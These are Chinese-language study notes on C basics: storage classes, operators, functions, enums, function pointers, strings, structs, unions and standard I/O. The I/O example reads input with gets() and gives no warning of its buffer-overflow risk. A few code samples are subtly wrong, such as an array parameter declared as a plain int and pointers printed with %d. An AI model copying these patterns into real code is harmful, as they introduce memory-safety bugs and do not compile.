<h1 id="C存储类"><a href="#C存储类" class="headerlink" title="C存储类"></a>C存储类</h1><p>存储类定义 C 程序中变量&#x2F;函数的范围（可见性）和生命周期。这些说明符放置在它们所修饰的类型之前。下面列出 C 程序中可用的存储类：</p>
<ul>
<li>auto</li>
<li>register</li>
<li>static</li>
<li>extern</li>
</ul>
<h2 id="auto存储类"><a href="#auto存储类" class="headerlink" title="auto存储类"></a>auto存储类</h2><p><strong>auto</strong> 存储类是所有局部变量默认的存储类。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> mount;</span><br><span class="line">   <span class="keyword">auto</span> <span class="type">int</span> month;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的实例定义了两个带有相同存储类的变量，auto 只能用在函数内，即 auto 只能修饰局部变量。</p>
<h2 id="register存储类"><a href="#register存储类" class="headerlink" title="register存储类"></a>register存储类</h2><p><strong>register</strong> 存储类用于定义存储在寄存器中而不是 RAM 中的局部变量。这意味着变量的最大尺寸等于寄存器的大小（通常是一个词），且不能对它应用一元的 ‘&amp;’ 运算符（因为它没有内存位置）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="keyword">register</span> <span class="type">int</span>  miles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>寄存器只用于需要快速访问的变量，比如计数器。还应注意的是，定义 ‘register’ 并不意味着变量将被存储在寄存器中，它意味着变量可能存储在寄存器中，这取决于硬件和实现的限制。</p>
<h2 id="staic存储类"><a href="#staic存储类" class="headerlink" title="staic存储类"></a>staic存储类</h2><p><strong>static</strong> 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。</p>
<p>static 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。</p>
<p>全局声明的一个 static 变量或方法可以被任何函数或方法调用，只要这些方法出现在跟 static 变量或方法同一个文件中。</p>
<h2 id="extern存储类"><a href="#extern存储类" class="headerlink" title="extern存储类"></a>extern存储类</h2><p><strong>extern</strong> 存储类用于提供一个全局变量的引用，全局变量对所有的程序文件都是可见的。当您使用 <strong>extern</strong> 时，对于无法初始化的变量，会把变量名指向一个之前定义过的存储位置。</p>
<p>当您有多个文件且定义了一个可以在其他文件中使用的全局变量或函数时，可以在其他文件中使用 <em>extern</em>来得到已定义的变量或函数的引用。可以这么理解，<em>extern</em> 是用来在另一个文件中声明一个全局变量或函数。</p>
<h1 id="C运算符"><a href="#C运算符" class="headerlink" title="C运算符"></a>C运算符</h1><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><ul>
<li>^异或 </li>
<li>~取反 </li>
<li>&amp;按位与 </li>
<li>|按位或 </li>
<li>&lt;&lt;算数左移(左丢弃,右补0)</li>
<li>&gt;&gt;算数右移(正数左补0,负数补1,右丢弃)</li>
</ul>
<h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>下表将按运算符优先级从高到低列出各个运算符，具有较高优先级的运算符出现在表格的上面，具有较低优先级的运算符出现在表格的下面。在表达式中，较高优先级的运算符会优先被计算。</p>
<table>
<thead>
<tr>
<th align="left">类别</th>
<th align="left">运算符</th>
<th align="left">结合性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">后缀</td>
<td align="left">() [] -&gt; . ++ - -</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">一元</td>
<td align="left">+ - ! ~ ++ - - (type)* &amp; sizeof</td>
<td align="left">从右到左</td>
</tr>
<tr>
<td align="left">乘除</td>
<td align="left">* &#x2F; %</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">加减</td>
<td align="left">+ -</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">移位</td>
<td align="left">&lt;&lt; &gt;&gt;</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">关系</td>
<td align="left">&lt; &lt;&#x3D; &gt; &gt;&#x3D;</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">相等</td>
<td align="left">&#x3D;&#x3D; !&#x3D;</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">位与 AND</td>
<td align="left">&amp;</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">位异或 XOR</td>
<td align="left">^</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">位或 OR</td>
<td align="left">|</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">逻辑与 AND</td>
<td align="left">&amp;&amp;</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">逻辑或 OR</td>
<td align="left">||</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">条件</td>
<td align="left">?:</td>
<td align="left">从右到左</td>
</tr>
<tr>
<td align="left">赋值</td>
<td align="left">&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D;&gt;&gt;&#x3D; &lt;&lt;&#x3D; &amp;&#x3D; ^&#x3D; |&#x3D;</td>
<td align="left">从右到左</td>
</tr>
<tr>
<td align="left">逗号</td>
<td align="left">,</td>
<td align="left">从左到右</td>
</tr>
</tbody></table>
<h1 id="C函数"><a href="#C函数" class="headerlink" title="C函数"></a>C函数</h1><p>函数<strong>声明</strong>告诉编译器函数的名称、返回类型和参数。函数<strong>定义</strong>提供了函数的实际主体。</p>
<h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p>函数的所有组成部分：</p>
<ul>
<li><strong>返回类型：</strong>一个函数可以返回一个值。<strong>return_type</strong> 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是关键字 <strong>void</strong>。</li>
<li><strong>函数名称：</strong>这是函数的实际名称。函数名和参数列表一起构成了函数签名。</li>
<li><strong>参数：</strong>参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。</li>
<li><strong>函数主体：</strong>函数主体包含一组定义函数执行任务的语句。</li>
</ul>
<h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><p>当程序调用函数时，程序控制权会转移给被调用的函数。被调用的函数执行已定义的任务，当函数的返回语句被执行时，或到达函数的结束括号时，会把程序控制权交还给主程序。</p>
<h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><p>如果函数要使用参数，则必须声明接受参数值的变量。这些变量称为函数的<strong>形式参数</strong>。</p>
<p>形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。</p>
<p>当调用函数时，有两种向函数传递参数的方式：</p>
<table>
<thead>
<tr>
<th align="left">调用类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-call-by-value.html">传值调用</a></td>
<td align="left">该方法把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数不会影响实际参数。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-call-by-pointer.html">引用调用</a></td>
<td align="left">通过指针传递方式，形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作。</td>
</tr>
</tbody></table>
<p>默认情况下，C 使用<strong>传值调用</strong>来传递参数。一般来说，这意味着函数内的代码不能改变用于调用函数的实际参数。</p>
<p>###全局变量与局部变量在内存中的区别</p>
<ul>
<li>全局变量保存在内存的全局存储区中，占用静态的存储单元；</li>
<li>局部变量保存在栈中，只有在所在函数被调用时才动态地为变量分配存储单元。</li>
</ul>
<h3 id="初始化局部变量和全局变量"><a href="#初始化局部变量和全局变量" class="headerlink" title="初始化局部变量和全局变量"></a>初始化局部变量和全局变量</h3><p>当局部变量被定义时，系统不会对其初始化，您必须自行对其初始化。定义全局变量时，系统会自动对其初始化，如下所示：</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">初始化默认值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">int</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">char</td>
<td align="left">‘\0’</td>
</tr>
<tr>
<td align="left">float</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">pointer</td>
<td align="left">NULL</td>
</tr>
</tbody></table>
<p>正确地初始化变量是一个良好的编程习惯，否则有时候程序可能会产生意想不到的结果，因为未初始化的变量会导致一些在内存位置中已经可用的垃圾值。</p>
<h1 id="C-enum-枚举"><a href="#C-enum-枚举" class="headerlink" title="C enum(枚举)"></a>C enum(枚举)</h1><p>枚举是 C 语言中的一种基本数据类型，它可以让数据更简洁，更易读。</p>
<p>枚举语法定义格式为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>　枚举名　&#123;</span>枚举元素<span class="number">1</span>,枚举元素<span class="number">2</span>,……&#125;;</span><br></pre></td></tr></table></figure>

<p>接下来我们举个例子，比如：一星期有 7 天，如果不用枚举，我们需要使用 #define 来为每个整数定义一个别名：</p>
<p>#define MON  1 #define TUE  2 #define WED  3 #define THU  4 #define FRI  5 #define SAT  6 #define SUN  7</p>
<p>这个看起来代码量就比较多，接下来我们看看使用枚举的方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">DAY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">      MON=<span class="number">1</span>, TUE, WED, THU, FRI, SAT, SUN</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这样看起来是不是更简洁了。</p>
<p><strong>注意：</strong>第一个枚举成员的默认值为整型的 0，后续枚举成员的值在前一个成员上加 1。我们在这个实例中把第一个枚举成员的值定义为 1，第二个就为 2，以此类推。</p>
<h2 id="枚举变量的定义"><a href="#枚举变量的定义" class="headerlink" title="枚举变量的定义"></a>枚举变量的定义</h2><p><strong>1、先定义枚举类型，再定义枚举变量</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">DAY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">      MON=<span class="number">1</span>, TUE, WED, THU, FRI, SAT, SUN</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">DAY</span> <span class="title">day</span>;</span></span><br></pre></td></tr></table></figure>

<p><strong>2、定义枚举类型的同时定义枚举变量</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">DAY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">      MON=<span class="number">1</span>, TUE, WED, THU, FRI, SAT, SUN</span><br><span class="line">&#125; day;</span><br></pre></td></tr></table></figure>

<p><strong>3、省略枚举名称，直接定义枚举变量</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">      MON=<span class="number">1</span>, TUE, WED, THU, FRI, SAT, SUN</span><br><span class="line">&#125; day;</span><br></pre></td></tr></table></figure>

<h1 id="C函数指针与回掉函数"><a href="#C函数指针与回掉函数" class="headerlink" title="C函数指针与回掉函数"></a>C函数指针与回掉函数</h1><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>函数指针是指向函数的指针变量。</p>
<p>通常我们说的指针变量是指向一个整型、字符型或数组等变量，而函数指针是指向函数。</p>
<p>函数指针可以像一般函数一样，用于调用函数、传递参数。</p>
<p>函数指针变量的声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*fun_ptr)</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>)</span>; <span class="comment">// 声明一个指向同样参数、返回值的函数指针类型</span></span><br></pre></td></tr></table></figure>

<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &gt; y ? x : y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/*p是函数指针*/</span></span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>, <span class="type">int</span>) = &amp; max; <span class="comment">//&amp; 可以省略</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,max);  <span class="comment">// 1586090832</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;max); <span class="comment">// 1586090832</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,*max); <span class="comment">// 1586090832</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,p); <span class="comment">// 1586090832</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;p); <span class="comment">// -431306128</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,*p); <span class="comment">// 1586090832</span></span><br><span class="line">    <span class="type">int</span> a, b ,c ,d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入三个数字:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    d = p(p(a,b), c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最大的数字是:%d\n&quot;</span>,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行，输出结果如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">158690832</span><br><span class="line">158690832</span><br><span class="line">158690832</span><br><span class="line">158690832</span><br><span class="line">-431306128</span><br><span class="line">158690832</span><br><span class="line">请输入三个数字:1 2 3</span><br><span class="line">最大的数字是:3</span><br></pre></td></tr></table></figure>

<h2 id="回掉函数"><a href="#回掉函数" class="headerlink" title="回掉函数"></a>回掉函数</h2><p>函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针调用的函数。</p>
<p>简单讲：回调函数是由别人的函数执行时调用你实现的函数。</p>
<blockquote>
<p>以下是来自知乎作者常溪玲的解说：</p>
<p>你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的电话，过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取了货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。</p>
</blockquote>
<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  <span class="comment">// 回调函数 </span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">populate_array</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>, <span class="type">size_t</span> arraySize, <span class="type">int</span> (*getNextValue)(<span class="type">void</span>))</span> </span><br><span class="line">&#123;    <span class="keyword">for</span> (<span class="type">size_t</span> i=<span class="number">0</span>; i&lt;arraySize; i++)        </span><br><span class="line">  			<span class="built_in">array</span>[i] = getNextValue(); </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 获取随机值 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getNextRandomValue</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;    </span><br><span class="line">  <span class="keyword">return</span> rand(); </span><br><span class="line">&#125;  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;    </span><br><span class="line">  <span class="type">int</span> myarray[<span class="number">10</span>];    </span><br><span class="line">  <span class="comment">/* getNextRandomValue 不能加括号，否则无法编译，因为加上括号之后相当于传入此参数时传入了 int , 而不是函数指针*/</span></span><br><span class="line">  populate_array(myarray, <span class="number">10</span>, getNextRandomValue);    </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, myarray[i]);    </span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);    </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行，输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16807 282475249 1622650073 984943658 1144108930 470211272 101027544 1457850878 1458777923 2007237709 </span><br></pre></td></tr></table></figure>

<h1 id="C字符串"><a href="#C字符串" class="headerlink" title="C字符串"></a>C字符串</h1><p>在 C 语言中，字符串实际上是使用 <strong>null</strong> 字符 ‘\0’ 终止的一维字符数组。因此，一个以 null 结尾的字符串，包含了组成字符串的字符。</p>
<p>下面的声明和初始化创建了一个 “Hello” 字符串。由于在数组的末尾存储了空字符，所以字符数组的大小比单词 “Hello” 的字符数多一个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> greeting[<span class="number">6</span>] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>依据数组初始化规则，您可以把上面的语句写成以下语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> greeting[] = <span class="string">&quot;Hello&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>以下是 C&#x2F;C++ 中定义的字符串的内存表示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234080.jpg" alt="C/C++ 中的字符串表示"></p>
<p>其实，您不需要把 <em>null</em> 字符放在字符串常量的末尾。C 编译器会在初始化数组时，自动把 ‘\0’ 放在字符串的末尾。</p>
<p>C 中有大量操作字符串的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 目的</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>strcpy(s1, s2);</strong> 复制字符串 s2 到字符串 s1。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>strcat(s1, s2);</strong> 连接字符串 s2 到字符串 s1 的末尾。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>strlen(s1);</strong> 返回字符串 s1 的长度。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>strcmp(s1, s2);</strong> 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>strchr(s1, ch);</strong> 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>strstr(s1, s2);</strong> 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</td>
</tr>
</tbody></table>
<h1 id="C结构体"><a href="#C结构体" class="headerlink" title="C结构体"></a>C结构体</h1><p>##位域</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//说明 data 为 bs 变量，共占两个字节。其中位域 a 占 8 位，位域 b 占 2 位，位域 c 占 6 位。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> a:<span class="number">8</span>;</span><br><span class="line">  <span class="type">int</span> b:<span class="number">2</span>;</span><br><span class="line">  <span class="type">int</span> c:<span class="number">6</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//在这里，packed_struct 包含了 6 个成员：四个 1 位的标识符 f1..f4、一个 4 位的 type 和一个 9 位的 my_int。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packed_struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> f1:<span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> f2:<span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> f3:<span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> f4:<span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> type:<span class="number">4</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> my_int:<span class="number">9</span>;</span><br><span class="line">&#125; pack;</span><br><span class="line"><span class="comment">//空域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> a:<span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span>  :<span class="number">2</span>; <span class="comment">// 该2位不能使用</span></span><br><span class="line">  <span class="type">int</span> b:<span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> c:<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="C共用体"><a href="#C共用体" class="headerlink" title="C共用体"></a>C共用体</h1><p><strong>共用体</strong>是一种特殊的数据类型，允许您在相同的内存位置存储不同的数据类型。您可以定义一个带有多成员的共用体，但是任何时候只能有一个成员带有值。共用体提供了一种使用相同的内存位置的有效方式。</p>
<h2 id="定义共用体"><a href="#定义共用体" class="headerlink" title="定义共用体"></a>定义共用体</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">float</span> f;</span><br><span class="line">  <span class="type">char</span> str[<span class="number">20</span>];</span><br><span class="line">&#125; data;</span><br></pre></td></tr></table></figure>



<h1 id="Ctypedef"><a href="#Ctypedef" class="headerlink" title="Ctypedef"></a>Ctypedef</h1><h2 id="typedef和define"><a href="#typedef和define" class="headerlink" title="typedef和define"></a>typedef和define</h2><ul>
<li><strong>typedef</strong> 仅限于为类型定义符号名称，**#define** 不仅可以为类型定义别名，也能为数值定义别名，比如您可以定义 1 为 ONE。</li>
<li><strong>typedef</strong> 是由编译器执行解释的，**#define** 语句是由预编译器进行处理的。</li>
</ul>
<h1 id="C输入和输出"><a href="#C输入和输出" class="headerlink" title="C输入和输出"></a>C输入和输出</h1><p>当我们提到<strong>输入</strong>时，这意味着要向程序填充一些数据。输入可以是以文件的形式或从命令行中进行。C 语言提供了一系列内置的函数来读取给定的输入，并根据需要填充到程序中。</p>
<p>当我们提到<strong>输出</strong>时，这意味着要在屏幕上、打印机上或任意文件中显示一些数据。C 语言提供了一系列内置的函数来输出数据到计算机屏幕上和保存数据到文本文件或二进制文件中。</p>
<h2 id="标准文件"><a href="#标准文件" class="headerlink" title="标准文件"></a>标准文件</h2><p>C <strong>语言把所有的设备都当作文件</strong>。所以设备（比如显示器）被处理的方式与文件相同。以下三个文件会在程序执行时自动打开，以便访问键盘和屏幕。</p>
<table>
<thead>
<tr>
<th align="left">标准文件</th>
<th align="left">文件指针</th>
<th align="left">设备</th>
</tr>
</thead>
<tbody><tr>
<td align="left">标准输入</td>
<td align="left">stdin</td>
<td align="left">键盘</td>
</tr>
<tr>
<td align="left">标准输出</td>
<td align="left">stdout</td>
<td align="left">屏幕</td>
</tr>
<tr>
<td align="left">标准错误</td>
<td align="left">stderr</td>
<td align="left">您的屏幕</td>
</tr>
</tbody></table>
<p>文件指针是访问文件的方式，本节将讲解如何从屏幕读取值以及如何把结果输出到屏幕上。</p>
<p>C 语言中的 I&#x2F;O (输入&#x2F;输出) 通常使用 printf() 和 scanf() 两个函数。</p>
<p>scanf() 函数用于从标准输入（键盘）读取并格式化， printf() 函数发送格式化输出到标准输出（屏幕）。</p>
<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 执行 printf() 函数需要该库</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;菜鸟教程&quot;</span>);  <span class="comment">//显示引号中的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>编译以上程序，输出结果为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">菜鸟教程</span><br></pre></td></tr></table></figure>

<p><strong>实例解析：</strong></p>
<ul>
<li>所有的 C 语言程序都需要包含 <strong>main()</strong> 函数。 代码从 <strong>main()</strong> 函数开始执行。</li>
</ul>
<ul>
<li><strong>printf()</strong> 用于格式化输出到屏幕。<strong>printf()</strong> 函数在 <strong>“stdio.h”</strong> 头文件中声明。</li>
<li><strong>stdio.h</strong> 是一个头文件 (标准输入输出头文件) and <strong>#include</strong> 是一个预处理命令，用来引入头文件。 当编译器遇到 <strong>printf()</strong> 函数时，如果没有找到 <strong>stdio.h</strong> 头文件，会发生编译错误。</li>
<li><strong>return 0;</strong> 语句用于表示退出程序。</li>
</ul>
<h2 id="getchar-amp-putchar-函数"><a href="#getchar-amp-putchar-函数" class="headerlink" title="getchar() &amp; putchar() 函数"></a>getchar() &amp; putchar() 函数</h2><p><strong>int getchar(void)</strong> 函数从屏幕读取下一个可用的字符，并把它返回为一个整数。这个函数在同一个时间内只会读取一个单一的字符。您可以在循环内使用这个方法，以便从屏幕上读取多个字符。</p>
<p><strong>int putchar(int c)</strong> 函数把字符输出到屏幕上，并返回相同的字符。这个函数在同一个时间内只会输出一个单一的字符。您可以在循环内使用这个方法，以便在屏幕上输出多个字符。</p>
<h2 id="gets-amp-puts-函数"><a href="#gets-amp-puts-函数" class="headerlink" title="gets() &amp; puts() 函数"></a>gets() &amp; puts() 函数</h2><p><strong>char *gets(char *s)</strong> 函数从 <strong>stdin</strong> 读取一行到 <strong>s</strong> 所指向的缓冲区，直到一个终止符或 EOF。</p>
<p><strong>int puts(const char *s)</strong> 函数把字符串 s 和一个尾随的换行符写入到 <strong>stdout</strong>。</p>
<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( )</span> </span><br><span class="line">&#123;   </span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>];    </span><br><span class="line">  <span class="built_in">printf</span>( <span class="string">&quot;Enter a value :&quot;</span>);   </span><br><span class="line">  gets( str );</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>( <span class="string">&quot;\nYou entered: &quot;</span>);   </span><br><span class="line">  <span class="built_in">puts</span>( str );   </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并读取一整行直到该行结束，显示如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$./a.out</span><br><span class="line">Enter a value :runoob</span><br><span class="line"></span><br><span class="line">You entered: runoob</span><br></pre></td></tr></table></figure>

<h2 id="scanf-和-printf-函数"><a href="#scanf-和-printf-函数" class="headerlink" title="scanf() 和 printf() 函数"></a>scanf() 和 printf() 函数</h2><p><strong>int scanf(const char *format, …)</strong> 函数从标准输入流 <strong>stdin</strong> 读取输入，并根据提供的 <strong>format</strong> 来浏览输入。</p>
<p><strong>int printf(const char *format, …)</strong> 函数把输出写入到标准输出流 <strong>stdout</strong> ，并根据提供的格式产生输出。</p>
<p><strong>format</strong> 可以是一个简单的常量字符串，但是您可以分别指定 %s、%d、%c、%f 等来输出或读取字符串、整数、字符或浮点数。还有许多其他可用的格式选项，可以根据需要使用。如需了解完整的细节，可以查看这些函数的参考手册。现在让我们通过下面这个简单的实例来加深理解：</p>
<p>实例:</p>
